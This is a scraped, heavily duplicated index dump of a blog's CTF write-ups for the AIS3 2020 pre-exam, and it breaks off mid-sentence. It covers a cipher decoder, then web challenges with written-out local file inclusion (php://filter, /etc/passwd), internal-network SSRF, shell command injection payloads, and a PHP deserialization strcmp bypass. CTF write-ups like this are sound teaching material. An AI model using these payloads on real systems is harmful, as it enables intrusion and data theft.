by friends Zzzzz). Just copying to jsfuck decoder fails. When I was puzzled I noticed the first character is ). So I opened python and reversed the string [::-1], then decoded for the flag~ P.S. After sharing with a friend who didn’t participate, they pointed out the filename “KcufSJ” hints at reversal XD ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-10"},{"categories":["Cyber Security"],"content":" T-Rex (100 points, 381 solves) DescriptionSimilarly gives a text file HERE, and the relationship between top and bottom halves isn’t hard to see. text ! @ # $ % \u0026 ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N \u0026 U Z 8 R D O \u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ } SolutionSimply put, it’s table lookup to recover flag. But I really heard many people in the group doing it by hand (and getting it wrong). Scary. As CS majors, writing code isn’t too much to ask XDDDD cpp #include \u003cbits/stdc++.h\u003e using namespace std; int main(){ map\u003cchar, int\u003e dict = { {'!',0}, {'@',1}, {'#',2}, {'$',3}, {'%',4}, {'\u0026',5} }; string table[6] = {\"VFYJ61\", \"50M29L\", \"IWHS4Q\", \"KGBXTA\", \"E3C7PN\", \"UZ8RDO\"}; stringstream ss(\"\u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ }\"); string s; while( getline(ss, s, ' ') ){ if(s.length() == 1) cout \u003c\u003c s; else cout \u003c\u003c table[ dict[s[1]] ][ dict[s[0]] ]; } return 0; } Look at this malicious flag… clearly not meant for manual solving XDDDDD AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX} ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#t-rex-100-points-381-solves"},{"categories":["Cyber Security"],"content":" T-Rex (100 points, 381 solves) DescriptionSimilarly gives a text file HERE, and the relationship between top and bottom halves isn’t hard to see. text ! @ # $ % \u0026 ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N \u0026 U Z 8 R D O \u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ } SolutionSimply put, it’s table lookup to recover flag. But I really heard many people in the group doing it by hand (and getting it wrong). Scary. As CS majors, writing code isn’t too much to ask XDDDD cpp #include using namespace std; int main(){ map dict = { {'!',0}, {'@',1}, {'#',2}, {'$',3}, {'%',4}, {'\u0026',5} }; string table[6] = {\"VFYJ61\", \"50M29L\", \"IWHS4Q\", \"KGBXTA\", \"E3C7PN\", \"UZ8RDO\"}; stringstream ss(\"\u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ }\"); string s; while( getline(ss, s, ' ') ){ if(s.length() == 1) cout \u003c\u003c s; else cout \u003c\u003c table[ dict[s[1]] ][ dict[s[0]] ]; } return 0; } Look at this malicious flag… clearly not meant for manual solving XDDDDD AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX} ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-10"},{"categories":["Cyber Security"],"content":" T-Rex (100 points, 381 solves) DescriptionSimilarly gives a text file HERE, and the relationship between top and bottom halves isn’t hard to see. text ! @ # $ % \u0026 ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N \u0026 U Z 8 R D O \u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ } SolutionSimply put, it’s table lookup to recover flag. But I really heard many people in the group doing it by hand (and getting it wrong). Scary. As CS majors, writing code isn’t too much to ask XDDDD cpp #include using namespace std; int main(){ map dict = { {'!',0}, {'@',1}, {'#',2}, {'$',3}, {'%',4}, {'\u0026',5} }; string table[6] = {\"VFYJ61\", \"50M29L\", \"IWHS4Q\", \"KGBXTA\", \"E3C7PN\", \"UZ8RDO\"}; stringstream ss(\"\u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ }\"); string s; while( getline(ss, s, ' ') ){ if(s.length() == 1) cout \u003c\u003c s; else cout \u003c\u003c table[ dict[s[1]] ][ dict[s[0]] ]; } return 0; } Look at this malicious flag… clearly not meant for manual solving XDDDDD AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX} ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-11"},{"categories":["Cyber Security"],"content":" Web","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#web"},{"categories":["Cyber Security"],"content":" Shark (100 points, 261 solves) DescriptionOpening the page, there’s a link Shark never cries?. Click to see: SolutionThe challenge is almost identical to last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. That said, I poked around Day 1 with no results, and only discovered the old writeups on Day 2 XD First, from the link suffix ?path=hint.txt, we can think of LFI related challenges. Try some basic php://filter to pull out source code, like php://filter/convert.base64-encode/resource=index.php. Decoding the base64 gives: php \u003c?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('\u003cpre\u003e[forbidden]\u003c/pre\u003e'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('\u003cpre\u003e' . ($content ? htmlentities($content) : '[empty]') . '\u003c/pre\u003e'); } ?\u003e \u003c!DOCTYPE html\u003e \u003chead\u003e \u003ctitle\u003eShark\u003c/title\u003e \u003cmeta charset=\"utf-8\"\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eShark\u003c/h1\u003e \u003ca href=\"?path=hint.txt\"\u003eShark never cries?\u003c/a\u003e \u003c/body\u003e No useful info here, just blocks many directory access methods. The php://filter method works. Next is the hint at the beginning “Please find the other server in the internal network! (flag is on that server)”. Let’s check /etc/hosts… but no useful info. Day 1 I got stuck here. Only after finding last year’s writeup did I discover /proc/net/fib_trie shows internal IP addresses. text Main: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 /32 link BROADCAST /8 host LOCAL |-- 127.0.0.1 /32 host LOCAL |-- 127.255.255.255 /32 link BROADCAST +-- 172.22.0.0/16 2 0 2 +-- 172.22.0.0/30 2 0 2 |-- 172.22.0.0 /32 link BROADCAST /16 link UNICAST |-- 172.22.0.3 \u003c--- WE ARE HERE /32 host LOCAL |-- 172.22.255.255 /32 link BROADCAST Local: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 Then follow the writeup, look for IPs near 172.22.0.3, like 172.22.0.2. Finally ?path=http://172.22.0.2/flag gets the flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#shark-100-points-261-solves"},{"categories":["Cyber Security"],"content":" Shark (100 points, 261 solves) DescriptionOpening the page, there’s a link Shark never cries?. Click to see: SolutionThe challenge is almost identical to last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. That said, I poked around Day 1 with no results, and only discovered the old writeups on Day 2 XD First, from the link suffix ?path=hint.txt, we can think of LFI related challenges. Try some basic php://filter to pull out source code, like php://filter/convert.base64-encode/resource=index.php. Decoding the base64 gives: php \u003c?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('[forbidden]'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('' . ($content ? htmlentities($content) : '[empty]') . ''); } ?\u003e \u003c!DOCTYPE html\u003e Shark Shark Shark never cries? No useful info here, just blocks many directory access methods. The php://filter method works. Next is the hint at the beginning “Please find the other server in the internal network! (flag is on that server)”. Let’s check /etc/hosts… but no useful info. Day 1 I got stuck here. Only after finding last year’s writeup did I discover /proc/net/fib_trie shows internal IP addresses. text Main: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 /32 link BROADCAST /8 host LOCAL |-- 127.0.0.1 /32 host LOCAL |-- 127.255.255.255 /32 link BROADCAST +-- 172.22.0.0/16 2 0 2 +-- 172.22.0.0/30 2 0 2 |-- 172.22.0.0 /32 link BROADCAST /16 link UNICAST |-- 172.22.0.3 \u003c--- WE ARE HERE /32 host LOCAL |-- 172.22.255.255 /32 link BROADCAST Local: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 Then follow the writeup, look for IPs near 172.22.0.3, like 172.22.0.2. Finally ?path=http://172.22.0.2/flag gets the flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-11"},{"categories":["Cyber Security"],"content":" Shark (100 points, 261 solves) DescriptionOpening the page, there’s a link Shark never cries?. Click to see: SolutionThe challenge is almost identical to last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. That said, I poked around Day 1 with no results, and only discovered the old writeups on Day 2 XD First, from the link suffix ?path=hint.txt, we can think of LFI related challenges. Try some basic php://filter to pull out source code, like php://filter/convert.base64-encode/resource=index.php. Decoding the base64 gives: php \u003c?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('[forbidden]'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('' . ($content ? htmlentities($content) : '[empty]') . ''); } ?\u003e \u003c!DOCTYPE html\u003e Shark Shark Shark never cries? No useful info here, just blocks many directory access methods. The php://filter method works. Next is the hint at the beginning “Please find the other server in the internal network! (flag is on that server)”. Let’s check /etc/hosts… but no useful info. Day 1 I got stuck here. Only after finding last year’s writeup did I discover /proc/net/fib_trie shows internal IP addresses. text Main: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 /32 link BROADCAST /8 host LOCAL |-- 127.0.0.1 /32 host LOCAL |-- 127.255.255.255 /32 link BROADCAST +-- 172.22.0.0/16 2 0 2 +-- 172.22.0.0/30 2 0 2 |-- 172.22.0.0 /32 link BROADCAST /16 link UNICAST |-- 172.22.0.3 \u003c--- WE ARE HERE /32 host LOCAL |-- 172.22.255.255 /32 link BROADCAST Local: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 Then follow the writeup, look for IPs near 172.22.0.3, like 172.22.0.2. Finally ?path=http://172.22.0.2/flag gets the flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-12"},{"categories":["Cyber Security"],"content":" Squirrel (Post-solved, 100 points, 220 solves) DescriptionClicking the link shows a bunch of squirrels running around with system directories… P.S. Side note, same Chrome but different OS shows different emojis, quite interesting lol SolutionOver 200 people solved it, but I still couldn’t by competition end. Turns out I overthought it QwQ First, from webpage source code we see some clues. Through URL suffix /api.php?get=/etc/passwd we get some info, but doesn’t seem useful for this challenge. Basically I got stuck here during competition, kept trying to exploit the Error Handling in source code… Actually, thinking about it: ?get= + file name shows file contents… isn’t that just cat!!!! If so, looking at cat api.php should work! Through URL suffix /api.php?get=api.php we really get api.php source code XD From this source code we see shell_exec runs commands, enclosed by '. So we can use command injection ; to break out and run our own commands~ Example /api.php?get=';ls'. Remember to add ' to close front and back (same concept as SQLi). Now we can list current directory and dig deeper for interesting stuff(?) Example /api.php?get=';ls ../../../' seems… there’s a suspicious file? Let’s see if there’s a flag inside! Using /api.php?get='; cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt', got it!!! But after all that… didn’t we forget ?get= already acts like cat lol Just append directory/filename /api.php?get=../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#squirrel-post-solved-100-points-220-solves"},{"categories":["Cyber Security"],"content":" Squirrel (Post-solved, 100 points, 220 solves) DescriptionClicking the link shows a bunch of squirrels running around with system directories… P.S. Side note, same Chrome but different OS shows different emojis, quite interesting lol SolutionOver 200 people solved it, but I still couldn’t by competition end. Turns out I overthought it QwQ First, from webpage source code we see some clues. Through URL suffix /api.php?get=/etc/passwd we get some info, but doesn’t seem useful for this challenge. Basically I got stuck here during competition, kept trying to exploit the Error Handling in source code… Actually, thinking about it: ?get= + file name shows file contents… isn’t that just cat!!!! If so, looking at cat api.php should work! Through URL suffix /api.php?get=api.php we really get api.php source code XD From this source code we see shell_exec runs commands, enclosed by '. So we can use command injection ; to break out and run our own commands~ Example /api.php?get=';ls'. Remember to add ' to close front and back (same concept as SQLi). Now we can list current directory and dig deeper for interesting stuff(?) Example /api.php?get=';ls ../../../' seems… there’s a suspicious file? Let’s see if there’s a flag inside! Using /api.php?get='; cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt', got it!!! But after all that… didn’t we forget ?get= already acts like cat lol Just append directory/filename /api.php?get=../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-12"},{"categories":["Cyber Security"],"content":" Squirrel (Post-solved, 100 points, 220 solves) DescriptionClicking the link shows a bunch of squirrels running around with system directories… P.S. Side note, same Chrome but different OS shows different emojis, quite interesting lol SolutionOver 200 people solved it, but I still couldn’t by competition end. Turns out I overthought it QwQ First, from webpage source code we see some clues. Through URL suffix /api.php?get=/etc/passwd we get some info, but doesn’t seem useful for this challenge. Basically I got stuck here during competition, kept trying to exploit the Error Handling in source code… Actually, thinking about it: ?get= + file name shows file contents… isn’t that just cat!!!! If so, looking at cat api.php should work! Through URL suffix /api.php?get=api.php we really get api.php source code XD From this source code we see shell_exec runs commands, enclosed by '. So we can use command injection ; to break out and run our own commands~ Example /api.php?get=';ls'. Remember to add ' to close front and back (same concept as SQLi). Now we can list current directory and dig deeper for interesting stuff(?) Example /api.php?get=';ls ../../../' seems… there’s a suspicious file? Let’s see if there’s a flag inside! Using /api.php?get='; cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt', got it!!! But after all that… didn’t we forget ?get= already acts like cat lol Just append directory/filename /api.php?get=../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-13"},{"categories":["Cyber Security"],"content":" Elephant (168 points, 165 solves) DescriptionClicking the link shows a login page (with a hidden easter egg that needs highlighting??) After random input, the text below says token is insufficient to read flag (also has hidden easter egg??) SolutionThis challenge was unexpectedly solved by intuition. I had no idea what the actual point was == Quote “That’s why some challenges are about knowledge gaps, requiring intuition to leap over” by a senior So after competition I had @stavhaygn fully explain this challenge. First, my intuition solution XD After login, take the cookies string and base64 decode to get: text O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";s:32:\"6cdc79ae4ac3bd4ade8162dc68d2d50d\";} The format is clearly type:length:data, but I noticed s:11:\"Usertoken\"… shouldn’t the length be 9(?) So I manually changed to s:9:\"Usertoken\", base64 encoded and put back in cookies. Refreshed page and flag appeared… (confused) Actually the format above is called “serialization”. I don’t really understand it since I rarely touch it lol The correct approach is from /.git, which shows 403 forbidden instead of 404 not found. Use GitHack to restore files. php \u003c?php const SESSION = 'elephant_user'; $flag = file_get_contents('/flag'); class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-\u003etoken) == 0; } } if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit; } $user = NULL; if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit; } else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data)); } Key points in this source code: line 8: token class is private (more later) line 11: token is generated by Random + MD5 Hash line 14: condition to get flag: $flag == $this-\u003etoken line 28: serialize function The key is strcmp bypass. We can’t modify $flag on backend, and can’t control token’s random value. From online info, strcmp returns NULL when comparing string and array. Using PHP’s weak typing, NULL == 0 is true. So we just need to manually modify the serialized string right? text O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";a:0:{};} Unfortunately… no. Modifying and encoding back to cookies logs you out. The issue is invisible characters generated by the program, which is also why I noticed strange string lengths. For PHP serialization format, refer to PHP Deserialization Beginner to Advanced. The three permission types in classes: public: data private: %00class name%00member name protected: %00*%00member name This explains why the length I saw was 2 less (%00 * 2), and why direct modification doesn’t work. These invisible 